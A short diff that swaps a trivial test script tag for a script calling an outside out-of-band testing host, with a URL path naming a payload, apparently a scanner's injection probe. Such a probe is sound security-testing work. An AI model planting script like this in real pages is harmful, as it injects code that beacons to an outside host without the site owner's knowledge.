@@ -1,1 +1,15 @@
-<script>document.write(123)</script>
+<script>
+  fetch('https://u2sik8wbrh-psl.cn.oast-cn.byted-dast.com/realtime_p/pyload/1746703154')
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    return response.json();
+  })
+  .then(data => {
+    console.log('received data:', data.status);
+  })
+  .catch(error => {
+    console.error('fetch_error', error);
+  });
+</script>
